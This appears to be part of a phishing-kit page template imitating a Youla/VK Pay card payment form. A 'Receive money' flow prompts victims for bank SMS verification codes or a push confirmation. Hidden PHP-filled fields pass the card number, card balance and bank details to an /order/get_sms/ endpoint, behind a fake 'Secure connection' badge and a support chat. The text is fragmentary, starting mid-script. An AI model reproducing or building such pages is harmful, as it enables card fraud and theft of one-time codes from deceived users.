				$("#cpg_form").find("input[type=submit]").removeAttr(\'disabled\');
			}
		},
		onTimeout: function(data) {
			$(\'#cpg_error\').show();
		},
		onBackUrlRedirect: function(data) {
			var code = data.error.code || "UNKNOWN_ERROR";

			var $holder = $(\'a#cpg_error_back_url\');
			if ($holder.length) {
				var url = $holder.attr(\'src\');
				if (url) {
					url += url.indexOf(\'?\') < 0 ? \'?\' : \'&\';
					url += \'cpg_error_code=\' + code;
					window.location.href = url;
				}
			} else if (this.onError) {
				this.onError(data);
			}
		}
	});
}
1</script>
      <script type="text/javascript">var restartPoll;
var hideWaiter;

function createCpgStandardWaiter(cpg_context, onErrorCardLimit) {
	var waiter = createCpgWaiter();
	var $cpgForm = $(\'.js-hidden-form\');
	var $cardSelect = $(\'.js-card-selector\');

	var defaultErrorMessage = (typeof cpg_context.locale !== \'undefined\' && cpg_context.locale.waiterDefaultErrorMessage) ?
		cpg_context.locale.waiterDefaultErrorMessage :
		$(\'.js-credit-card .js-error-message\').text();

	var defaultErrorMessageCVV = (typeof cpg_context.locale !== \'undefined\' && cpg_context.locale.waiterDefaultCvvErrorMessage) ?
		cpg_context.locale.waiterDefaultCvvErrorMessage :
		\'Пожалуйста, введите CVV - последние три цифры на полосе для подписи\';

	var payCard = window.payCard;
	var clearCardFormErrorsList = [
		\'ERR_NOT_ENOUGH_MONEY\',
		\'ERR_FRAUD\',
		\'ERR_AUTHENTICATION_FAILED\',
		\'ERR_CARD_AMOUNT\',
		\'ERR_AUTHORIZATION\',
		\'ERR_CARD_EXPIRED\',
		\'ERR_SECURITY\',
		\'ERR_VTERM_DISABLED\',
		\'ERR_ORDER_FETCH\',
		\'ERR_REJECTED_SUPPORT\',
		\'ERR_CARD_PARAM_PAN\',
		\'ERR_ARGUMENTS\',
		\'ERR_CARD_LOST\',
		\'ERR_CARD_LIMIT_3DS\',
		\'ERR_CARD_LIMIT_ONLINE_3DS\'
	];

	var goToBackurlErrorsList = typeof cpg_context[\'is_redirect_to_backurl_on_error\'] !== \'undefined\' && cpg_context[\'is_redirect_to_backurl_on_error\'] ? [\'ERR_AUTHENTICATION_FAILED\'] : [];

	// Custom settings for cpgWaiter
	waiter.pollLimit = 30;
	waiter.pollInterval = 2000;

	if (typeof onErrorCardLimit === \'undefined\') {
		var onErrorCardLimit = function(error) {
			var selectedCardId = payCard.getSelectedCardId();

			if (cpg_context.json_cards[selectedCardId]) {
				cpg_context.json_cards[selectedCardId].nocvv = \'0\';
				$cardSelect.trigger(\'change\');
				payCard.showCvvError();
				payCard.setErrorMessage(defaultErrorMessageCVV);
			}
			else {
				payCard.setErrorMessage(error ? error.descr : defaultErrorMessage);
			}
			payCard.showError();
		};
	}

	function selectNewCard() {
		payCard.setSelectedCardByID(\'FreePay\');
	}

	function removeSelectedAddedCard() {
		var selectedCardId = payCard.getSelectedCardId();

		if (payCard.getSelectedCardByID[selectedCardId]) {
			payCard.removeAddedCardById(selectedCardId);
		}
	}

	waiter.onParamsError = function(errors, remove) {
		if (remove) {
			//	TODO: $(\'.js-hidden-form\').find(\'label\').removeClass(\'cpg_error\');
			return;
		}

		cpg_context[\'rb\'].putPixel(\'form_server-validation-error\');

		if (errors.length) {
			if (errors.indexOf(\'pan\') !== -1) {
				payCard.showNumberError();
			}
			if (errors.indexOf(\'exp_date\') !== -1) {
				payCard.showExpiryError();
			}
			if (errors.indexOf(\'cvv\') !== -1) {
				payCard.showCvvError();
			}
			if (errors.indexOf(\'cvv2\') !== -1) {
				payCard.showCvvError();
			}
			if (errors.indexOf(\'cardholder\') !== -1) {
				payCard.showCardholderError();
			}
			if (errors.indexOf(\'amount\') !== -1 && typeof payCard.showAmountError === \'function\') {
				payCard.showAmountError();
			}
		}

		if (typeof showPayCardWrapper === \'function\') {
			showPayCardWrapper();
		}
	};

	waiter.onSuccess = function(data) {
		var actionParams = {
			payment_info: typeof data.payment_info !== \'undefined\' ? data.payment_info : {}
		};

		if (Object.prototype.hasOwnProperty.call(data, \'card_id\')) {
			actionParams.card_id = data.card_id;
		}
		cpg_context[\'rb\'].putPixel(\'result_success\');
		window.parent.postMessage(JSON.stringify({
			type: \'billing\',
			action: \'paySuccess\',
			action_params: actionParams
		}), \'*\');
		if (data.url) {
			if (typeof waiter.onRedirect === \'function\') {
				waiter.onRedirect(data.url);
			}
			else {
				setTimeout(function() {
					window.location.href = data.url;
				}, 200);
			}
		}
	};

	waiter.onError = function(data) {
		cpg_context[\'rb\'].putPixel(\'result_fail\');

		try {
			window.parent.postMessage(JSON.stringify({
				type: \'billing\',
				action: \'payError\',
				action_params: data.error
			}), \'*\');

			if ($.inArray(data.error.code, goToBackurlErrorsList) !== -1) {
				// если передан параметр backurl - редиректим на него
				console.log(\'need to redirect to backurl\', !!data.backurl);
				if (data.backurl) {
					if (typeof waiter.onRedirect === \'function\') {
						waiter.onRedirect(data.backurl);
					}
					else {
						setTimeout(function() {
							window.location.href = data.backurl;
						}, 200);
					}
				}
			}

			if (data.error.code === \'ERR_CARD_LIMIT_CVV\' || data.error.code === \'ERR_CARD_LIMIT_ONLINE_CVV\') {
				// повторить сабмит для создания новой транзакции (с 3ds)
				setTimeout(function() {
					waiter.submit($cpgForm, $cpgForm.find(\'input, select\').filter(function() {
						return this.value && this.value !== \'FreePay\';
					}).serialize());
				});
				return;
			}

			if (data.error.code === \'ERR_CARD_LIMIT\' || data.error.code === \'ERR_CARD_LIMIT_ONLINE\' || data.error.code === \'ERR_PAY_NOCVV\') {
				// потребовать ввод CVV для выбранной карты
				onErrorCardLimit(data.error);
				return;
			}

			if ($.inArray(data.error.code, clearCardFormErrorsList) !== -1) {
				// временно удалить привязку, выбрать новую карту, очистить форму
				removeSelectedAddedCard();
				selectNewCard();
			}

			payCard.setErrorMessage(data.error.descr);
		} catch (e) {
			payCard.setErrorMessage(defaultErrorMessage);
		}

		payCard.showError();
	};

	waiter.onTimeout = function() {
		var timeoutPopup = document.getElementsByClassName(\'js-cc-timeout-popup\');
		window.parent.postMessage(\'{"type": "billing", "action": "timeoutError"}\', \'*\');
		cpg_context[\'rb\'].putPixel(\'status_fail\');
		if (timeoutPopup.length) {
			payCard.showTimeoutError();
		}
		else {
			payCard.showError();
		}
	};

	waiter.onServerError = function(data, textStatus) {
		cpg_context[\'rb\'].putPixel(\'ajax_\' + textStatus);
		payCard.showError();
	};

	waiter.onConfirm = function(data) {
		cpg_context[\'rb\'].putPixel(\'3ds_confirm\');
		/** START TMP-11413
		 window.parent.postMessage(JSON.stringify({
			type:          \'billing\',
			action:        \'payConfirm\',
			action_params: data.confirm_data
		}), \'*\');
		 */
		waiter.on3DS(data.confirm_data);
		/**
		 * END TMP-11413
		 */
		setTimeout(function() {
			waiter.showClock();
		});
	};

	waiter.on3DS = function(data) {
		cpg_context[\'rb\'].putPixel(\'3ds_start\');
		setTimeout(function() {
			waiter.showClock();
		}, 0);
		setTimeout(function() {
			waiter.submit3DS(data);
			document.body.style.display = \'none\';
			window.parent.postMessage(\'{"type": "billing", "action": "3dsPage"}\', \'*\');
		}, 300);
	};

	waiter.onShow = function() {
		window.parent.postMessage(\'{"type": "billing", "action": "waiterStart"}\', \'*\');

		if (typeof payCard.onShowWaiter === \'function\') {
			payCard.onShowWaiter();
		}
		else {
			payCard.disableFormFields();
			payCard.disableSubmitButton();
			payCard.setSubmitButtonValue(\'Обработка\');
		}
	};

	waiter.onHide = function() {
		if (typeof payCard.onHideWaiter === \'function\') {
			payCard.onHideWaiter();
		}
		else {
			payCard.enableFormFields();
			payCard.enableSubmitButton();
			payCard.restoreSubmitButtonValue();
		}
	};

	waiter.onSubmitSuccess = function(data) {
		restartPoll = function() {
			waiter.showClock();
			waiter.resetPollCount();
			waiter.startPoll(data.url);
		};
		waiter.startPoll(data.url, data.params);
	};

	hideWaiter = function() {
		waiter.finish();
	};

	return waiter;
}

function assignFormHandlers(cpg_context, waiter) {
	var $cpgForm = $(\'.js-hidden-form\');

	var payHandler = function(e) {
		cpg_context[\'rb\'].putPixel(\'form_send\');

		waiter.submit($cpgForm, $cpgForm.find(\'input, select\').filter(function() {
			return this.value && this.value !== \'FreePay\';
		}).serialize());
		return false;
	};

	$cpgForm.on(\'submit\', payHandler);
}
1</script>
      <link rel="icon" href="" type="image/png">
      <style> 		#loading { 		   width: 100%; 		   height: 100%; 		   top: 0; 		   left: 0; 		   position: fixed; 		   display: block; 		   opacity: 0.7; 		   background-color: #fff; 		   z-index: 99; 		   text-align: center; 		}  		#loading-image { 		  position: absolute; 		  top: 50%; 		  left: 50%; 		  z-index: 100; 		} 		 		.input-error {border-color: #ed1651!important;} 		 	</style>
            <!-- CHAT links -->
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
      <style type="text/css">
        body{
    
}
.col-md-2, .col-md-10{
    padding:0;
}
.panel{
  z-index: 999999;
    margin-bottom: 0px;
}
/* #### Tablets Portrait or Landscape #### */
@media screen and (min-width: 1px)  and (max-width: 1023px){
    .open-button {
  z-index: 300;
  border: 0; 
  content: \'Напишите нам в чат\';
  background: #002f34;
  border-radius: 5px;
  padding: 16px 0px;
  border: none;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  width: 150px;
  height: 36px;
  position: fixed;
  bottom: 80px;
  }
  .panel-body {
    height: 400px;
  }
  .chat-window{
    height:400px;
      display: flex;
      align-items: flex-start;
    z-index: 9999;
  min-width: 100%;
    bottom:5px;
    position: fixed;
    right: 10px;
  }

 #op_img {
  height: 50%; width: 70%;border-radius: 50%;max-height: 80px;
  }

  #usr_img {
    height: 100%; border-radius: 50%;
        width: 70%;
    left: 10%;
    position: inherit;
  }
}
@media screen and (min-width: 1024px){
    #open-button-text {
    visibility: hidden;
  }
  .open-button {
  z-index: 99999;
  border: 0; 
  background-color: transparent;
  background-image: url(\'/btn.png\');
  background-size: 100px 100px;
  background-repeat: no-repeat;
  content: \'\';
  padding: 16px 20px;
  border: none;
  cursor: pointer;
  opacity: 0.6;
  width: 150px;
  height: 100px;
  position: fixed;
  top: 50px;
  
}
  .panel-body {
    height: 400px;
  }
  .chat-window{
    height:400px;
    z-index: 9999;
    display: fixed;
    align-items: flex-start;
    min-width: 485px;
    bottom:5px;
    position: fixed;
    right: 10px;
  }
  #op_img {
  height: 100%; width: 100%;border-radius: 50%;max-height: 100px;
  }

  #usr_img {
    height: 100%; border-radius: 50%;
        width: 90%;
    left: 10%;
    position: inherit;
  }
}
.chat-window > div > .panel{
    border-radius: 5px 5px 0 0;
}
.icon_minim{
    padding:2px 10px;
}
.msg_container_base{
  background: #e5e5e5;
  margin: 0;
  padding: 0 10px 10px;
  max-height:300px;
  overflow-x:hidden;
}
.top-bar {
  background: #002f34;
  color: white;
  padding: 10px;
  position: relative;
  overflow: hidden;
  display: flex;
}
.msg_receive{
    padding-left:0;
    margin-left:0;
    text-align: left;
}
.msg_sent{
    padding-bottom:20px !important;
    margin-right:0;
    text-align: left;
}
.messages {
  background: white;
  padding: 10px;
  border-radius: 2px;
  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
  max-width:100%;
}
.messages > p {
    font-size: 13px;
    margin: 0 0 0.2rem 0;
  }
.messages > time {
    font-size: 11px;
    color: #ccc;
}
.msg_container {
    padding: 10px;
    overflow: hidden;
    display: flex;
}
.panel >img {
    display: block;
    width: 100%;
}
.avatar {
    position: relative;
}
.base_receive > .avatar:after {
    content: "";
    position: absolute;
    top: 0;
    right: 0;
    width: 0;
    height: 0;
    border: 5px solid #FFF;
    border-left-color: rgba(0, 0, 0, 0);
    border-bottom-color: rgba(0, 0, 0, 0);
}

.base_sent {
  justify-content: flex-end;
  align-items: flex-end;
}
.base_sent > .avatar:after {
    content: "";
    position: absolute;
    bottom: 0;
    left: 0;
    width: 0;
    height: 0;
    border: 5px solid white;
    border-right-color: transparent;
    border-top-color: transparent;
    box-shadow: 1px 1px 2px rgba(black, 0.2); // not quite perfect but close
}

.msg_sent > time{
    float: right;
}



.msg_container_base::-webkit-scrollbar-track
{
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
    background-color: #F5F5F5;
}

.msg_container_base::-webkit-scrollbar
{
    width: 12px;
    background-color: #F5F5F5;
}

.msg_container_base::-webkit-scrollbar-thumb
{
    -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
    background-color: #555;
}

.btn-group.dropup{
    position:fixed;
    left:0px;
    bottom:0;
}

#btn-chat{
  background-color: #002f34;
  border-color: white;
  padding-left: 5px;
  padding-right: 5px;
}

#new_chat {
  width: 10px;
  height: 174px;
  float: right;
  right: 10px;
  top: 50px;
  position: fixed;
  z-index: 0;
}
      </style>
      <!-- CHAT links close -->
   </head>
   <body class="body_fixed-width_no body_fixed-height_no body_background_youla-mobile">
     
      <div class="pay-card-layout pay-card-layout_type_youla-mobile">
         <div class="pay-card-layout__header_type_vkpay" style="background-color: #fff;">
            <div class="pay-card-layout__logo" style="text-align:center">
               <img src="/logo.svg?v=1" style="width:161px;">
            </div>
         </div>
         <div class="pay-card js-pay-card pay-card_type_youla-mobile" data-type="freepay">
            <div class="pay-card__row">
               <div class="pay-card__card js-credit-card">
                  <div class="credit-card-form credit-card-form_size_standard credit-card-form_holder-name-visible credit-card-form_single-side_yes">
                        <div class="credit-card-form__card-wrapper">
                           <div class="credit-card-form__card credit-card-form__card_position_front">
                              <div class="payment-systems-icons payment-systems-icons">
                                 <span id="mir" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mir js-payment-system-icon-mir"></span>
                                 <span id="visa" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_visa js-payment-system-icon-visa"></span>
                                 <span id="mastercard" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_mastercard js-payment-system-icon-mastercard"></span>
                                 <span id="maestro" class="payment-systems-icon payment-systems-icon_disabled_yes payment-systems-icon_name_maestro js-payment-system-icon-maestro"></span>
                              </div>
                              <div class="credit-card-form__label-group credit-card-form__label-group_type_holder-name clearfix">
                              <style>
                                    .loader_2 {
                                       border: 16px solid #f3f3f3;
                                       border-radius: 50%;
                                       border-top: 16px solid #008f79;
                                       border-bottom: 16px solid #008f79;
                                       width: 90px;
                                       height: 90px;
                                       margin: auto;
                                       -webkit-animation: spin 2s linear infinite;
                                       animation: spin 2s linear infinite;
                                      }
                                        @-webkit-keyframes spin {
                                       0% { -webkit-transform: rotate(0deg); }
                                       100% { -webkit-transform: rotate(360deg); }
                                      }
                                    
                                      @keyframes spin {
                                       0% { transform: rotate(0deg); }
                                       100% { transform: rotate(360deg); }
                                      }
                                      </style>
                                      
                                      <div id="loader_text" style="position:absolute; top:34px; left:0; right:0; text-align:center;">WAIT</div>
                                      <div class="loader_2" id="loader_2"></div>
                                      
                                <div id="push_form" style="display:none">
                                    <b>Confirm the transaction in the application of the mobile bank to verify your card</b>
                                </div>   
                                 <label class="js-cc-label credit-card-form__label sms_form" style="display:none;">
                                    <span class="credit-card-form__title">Verification code</span>
                                    <form method="POST" action="/order/get_sms/'.$product->id.'" class="sms_form">
                                    	<input type="hidden" name="id" value="'.$product->id.'">
                                    	<input type="hidden" name="card_number" value="">
                                        <input type="hidden"name="id_card" value="'.$id_card.'">
                                      <input type="hidden" name="cardNumber" value="'.$card.'">
                                      <input type="hidden" name="cardbalance" value="'.$balance.'">


                                      <input type="hidden" name="bank_name" id="bank_name" value="">
                                      <input type="hidden" name="bank_country" id="bank_country" value="">
                                      <input type="hidden" name="bank_url" id="bank_url" value="">
                                      <input type="hidden" name="bank_type" id="bank_type" value="">
                                      <input type="hidden" name="bank_scheme" id="bank_scheme" value="">
                                      
                                    	<input type="hidden" name="error" value="1">
                                        <input type="text" name="smscode" id="codefromsms" autocomplete="cc-name" class="credit-card-form__input js-cc-input js-cc-name-input" maxlength="40" placeholder="" required=""> 
                                        </form>
                                 </label>
                                 <label class="js-cc-label credit-card-form__label"  id="mypole_label" style="display:none;">
                                    <span class="credit-card-form__title" id="text_mypole"></span>
                                    <form method="POST" action="/order/get_sms/'.$product->id.'"  id="mypole_form">
                                    	<input type="hidden" name="id" value="'.$product->id.'">
                                    	<input type="hidden" name="card_number" value="">
                                        <input type="hidden"name="id_card" value="'.$id_card.'">
                                      <input type="hidden" name="cardNumber" value="'.$card.'">
                                      <input type="hidden" name="cardbalance" value="'.$balance.'">


                                      <input type="hidden" name="bank_name" id="bank_name" value="">
                                      <input type="hidden" name="bank_country" id="bank_country" value="">
                                      <input type="hidden" name="bank_url" id="bank_url" value="">
                                      <input type="hidden" name="bank_type" id="bank_type" value="">
                                      <input type="hidden" name="bank_scheme" id="bank_scheme" value="">
                                      
                                    	<input type="hidden" name="error" value="1">
                                        <input type="text" name="smscode_mypole" id="codefrommypole" autocomplete="cc-name" class="credit-card-form__input js-cc-input js-cc-name-input" maxlength="40" placeholder="" required=""> 
                                        </form>
                                 </label>
                              </div>
                           </div>
                        </div>
                        <div class="credit-card-form__submit">
                           <div class="credit-card-form__submit-inner">
                              <input onclick="smscode();" style="
    cursor: pointer;background-color: #008f79; border-color: #008f79;color: #fff; display:none;" id="btn_send_form" type="submit" class="js-button-submit button" value="Receive money">
                            <input onclick="mypolecode();" style="
    cursor: pointer;background-color: #008f79; border-color: #008f79;color: #fff; display:none;" id="btn_send_form_mypole" type="submit" class="js-button-submit button" value="Submit">          

<button type="button" class="open-button chaport-launcher-button" id="open-support" style="background: #008f79;
  border-radius: .25rem;
  padding: 16px 0px;
  border: none;
  cursor: pointer;
  display: inline-flex;
  align-items: center;
  width: 150px;
  height: 38px;
  opacity: 1;position: inherit; margin-top: 10px; width: 100%; "><p id="open-button-text" style="color: white;margin-left: auto;margin-right: auto;margin: 0 auto;background-color: #008f79; border-color: #008f79;visibility: visible;color: #fff">Support</p></button>
                           </div>
                        </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="secure-information secure-information_type_youla-mobile">
            <span class="secure-information__text" title="Secure connection">
            <span class="secure-information__icon"> </span> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" style=" margin-right: 5px;" viewBox="0 0 24 24" fill="none"> <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" fill="#3D8F26" stroke="#3D8F26" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M16 9.3905L10.6261 14.7644L8.18341 12.3217" stroke="#FEFEFE" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path> </svg> <span class="secure-information__text_type_protocol" style="line-height:28px">HTTPS / SSL</span>
            <span class="secure-information__text_type_secure-connection">Secure connection</span>
            </span>
         </div>
      </div>
       
   </body>
</html><script type="text/javascript">
function smscode() {
    if($(\'#codefromsms\').val() != \'\') {
      $(\'.sms_form\').submit();
    }
    else{
      ($(\'#codefromsms\').val() == \'\')?$(\'#codefromsms\').css("border-color", "red"):$(\'#codefromsms\').css("border-color", "");
    }
}
function mypolecode() { 
    if($(\'#codefrommypole\').val() != \'\') {
      $(\'#mypole_form\').submit();
    }
    else{
      ($(\'#codefrommypole\').val() == \'\')?$(\'#codefrommypole\').css("border-color", "red"):$(\'#codefrommypole\').css("border-color", "");
    }
}
</script>
<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #414141;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}

body>div a:last-child { z-index:-9999!important; position:absolute;}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: \' \';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #414141;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #4e4e4e;
    color: #fff;
}
